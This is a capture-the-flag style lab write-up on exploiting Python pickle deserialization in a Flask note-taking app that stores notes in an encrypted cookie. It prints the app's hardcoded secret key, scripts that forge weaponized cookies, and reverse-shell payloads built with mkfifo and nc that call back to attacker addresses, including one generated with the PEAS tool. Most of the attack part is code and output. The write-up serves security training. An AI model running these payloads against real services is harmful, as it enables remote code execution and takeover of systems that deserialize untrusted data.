The LAB 1 from the "Intro into Deserialization" skill assortment is a white-box type where we get access to the source code of a note-taking web-app which states that no login is needed to save what you wish "ONLY" on the fronted!

--------------------------------------------------------------------------------------------------------------------------
1)Starting by checking the source code locally we can see that is a flask application which means we could use "PEAS" to generate a RCE payload and get a revshell! Another thing that I see is that all the "juicy" code is in the **/app.py** the rest are html code resources for the back-end!

--------------------------------------------------------------------------------------------------------------------------
2)Checking the **app.py** routes and seems like there is the possibility to save via **/save** post request:
```
@app.route('/save', methods=['POST'])
def saveNote():
    dictionary = {'Title': '', 'Text': '',
                  'Date': datetime.now().strftime('%I:%M %p, %d %b %Y')}
    if request.method == 'POST':
        title = request.form['title']
        text = request.form['text']

    dictionary['Title'] = title
    dictionary['Text'] = text
    serialized = serialize(dictionary)
    resp = redirect(url_for('index'))
    resp.set_cookie('notes', serialized)
    return resp
```

More specifically I catched the request sent via Burpsuite and it looks like this:
`title=Culo&text=Mi+piace+la+figa%21`

What it more interesting is that seems like the note get's saved in the cookie?
Cookie: 
```
notes=Z0FBQUFBQmw2YmlUVTNzcW1kU0pOcnJKSDNldGhnYmlwRVVtRmZlazZxcGRPOHZvS3lONWxMN0Exbmtmb2xaZ0JTSUl0enZfNzJia09BLVA1TXJLa21DdHM0U0VUcmpwajg5dFF0MVR3QWdHOE10WUxHYTNjdE91M01GajZ5SUZCZlVhaG1fM0I4MnJBWHFvSUtLaHNZeDVOSGk4anRzcm05ZTI4WE15dFQ3YzVVbnJhTmNrS3NqUWhtZFd3UXpmTnNRTURVYTRhMk1m
```

--------------------------------------------------------------------------------------------------------------------------
3)Now what we need to know is how the cookie is encoded and we have the secretkey: 
```
app.config['SECRET_KEY'] = '@s3cur3P!ck13K3y'
```

Next we know that the cookie get's B64 encoded + AES SHA256 encrypted?
class encryptAES:
```
   def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(
            app.config['SECRET_KEY'].encode()).digest()[:32])
        self.f = Fernet(self.key)

```

--------------------------------------------------------------------------------------------------------------------------
4)Knowing this we should be able to steal part of the code to make it happen! We prepare the **app.py** where we remove the parameters read from the HTTP POST request as follows:
```
import base64
import hashlib
import pickle
import re
import sys
from datetime import datetime

from cryptography.fernet import Fernet
from flask import Flask, flash, redirect, render_template, request, url_for

app = Flask(__name__)
app.config['SECRET_KEY'] = '@s3cur3P!ck13K3y'


class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(
            app.config['SECRET_KEY'].encode()).digest()[:32])
        self.f = Fernet(self.key)

    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()

    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)


def serialize(dictionary):
    serialized = pickle.dumps(dictionary)
    serialized = encryptAES(serialized).encrypt()
    return serialized


def deserialize(serialized):
    try:
        serialized = encryptAES(serialized).decrypt()
    except:
        raise Exception('Invalid session!')
    if not re.search('Title.*?Text.*?Date', str(serialized)):
        raise Exception('Invalid session!')
    dictionary = pickle.loads(serialized)
    if [*dictionary] != ['Title', 'Text', 'Date']:
        raise Exception('Invalid session!')
    return dictionary
```

We prepare our Deserializer as well likewise:
```
└──╼ [★]$ cat Deserializer.py 
import sys
from app import deserialize

#Getting the token from args
token = sys.argv[1]
#Deserializing the token
result = deserialize(token)
print("Deserialized token is: ")
print(result)

This result in the code as follows:
└──╼ [★]$ python3 Deserializer.py "Z0FBQUFBQmw2YmlUVTNzcW1kU0pOcnJKSDNldGhnYmlwRVVtRmZlazZxcGRPOHZvS3lONWxMN0Exbmtmb2xaZ0JTSUl0enZfNzJia09BLVA1TXJLa21DdHM0U0VUcmpwajg5dFF0MVR3QWdHOE10WUxHYTNjdE91M01GajZ5SUZCZlVhaG1fM0I4MnJBWHFvSUtLaHNZeDVOSGk4anRzcm05ZTI4WE15dFQ3YzVVbnJhTmNrS3NqUWhtZFd3UXpmTnNRTURVYTRhMk1m"
Deserialized token is: 
{'Title': 'Culo', 'Text': 'Mi piace la figa!', 'Date': '07:52 AM, 07 Mar 2024'}
```

--------------------------------------------------------------------------------------------------------------------------
5)Now we need to prepare in the same fashion the Serializer.py
```
import sys
from app import serialize
from datetime import datetime

#Initialize the array
dictionary = {'Title': '', 'Text': '','Date': ''}
dictionary['Date'] = datetime.now().strftime('%I:%M %p, %d %b %Y')
#Reading the title/text args
dictionary['Title'] = sys.argv[1]
dictionary['Text'] = sys.argv[2]
result = serialize(dictionary)
print("The weaponized token is: ")
print(result)


```

Now that we have a working code we can use PEAS to generate a B64 code to get a rce: 
```
└─# python3 peas.py
Enter RCE command :rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.141 6666 >/tmp/f
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :y
Enter File location and name to save :/home/millycash/Downloads/LAB/exploit
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :Pickle
Done Saving file !!!
```


--------------------------------------------------------------------------------------------------------------------------
6) Now the problem is that we can't use PEAS since the back-ends is performing regex and checking Title,Text.Date need to be present otherwise the seralization won't be called:

```
    if not re.search('Title.*?Text.*?Date', str(serialized)):
        raise Exception('Invalid session!')
    dictionary = pickle.loads(serialized)
```

In this case we have to reuse the command from the academy via pickle as follows into **Serializer.py**:
```
import sys, os
from app import serialize
from datetime import datetime

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

#Initialize the array
dictionary = {'Title': '', 'Text': '','Date': ''}
dictionary['Date'] = datetime.now().strftime('%I:%M %p, %d %b %Y')
cmd = RCE()
dictionary['Title'] = 'RCE'
dictionary['Text'] = cmd
result = serialize(dictionary)
print("The weaponized token is: ")
print(result)
```

And now if we send the command to de-serialize via Deserializer.py we get a RCE:

```
┌─[eu-academy-1]─[10.10.14.141]─[htb-ac-835785@htb-sgvlkymwzh]─[~/LAB]
└──╼ [★]$ python3 Deserializer.py "Z0FBQUFBQmw2ZEplcDBybWZnc2xKLTNYbjk0czdweGhWUkNYZFJiTndpN0RvelpuQnE2QnBmY2x3b1d3UDRSbE5wT25va1I1WFBxZjNxWHBVUzIxbEgtV1A1UnduQVZPQjBnNkhzUElmRDBBd2lhemZrclZac2pxQzN3cUdBZzQyTmt4SjEzYUhrcDlMeXRlbkdMUkp1Wm0yTmlVR3VHTzlXSHVfWlRlbklab25lRDBmQ24xZlBFYW5YZDlSWGxyQmVqMi1ZVmxGVzVzMTZSRHkxSmUxd0NiR1o1bk4zYjdkd2M5UDdLZFcxZ3VTb2hLZFpQRHpyMD0="
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.063 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.045 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.031 ms

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4063ms
rtt min/avg/max/mdev = 0.023/0.040/0.063/0.013 ms
Deserialized token is: 
{'Title': 'RCE', 'Text': 0, 'Date': '02:42 PM, 07 Mar 2024'}
```

--------------------------------------------------------------------------------------------------------------------------
7)Knowing this we can adapt the code to perform a Revshell instead and it should kick a shell in our NC lisener when we refresh / and the new token get's deserialized!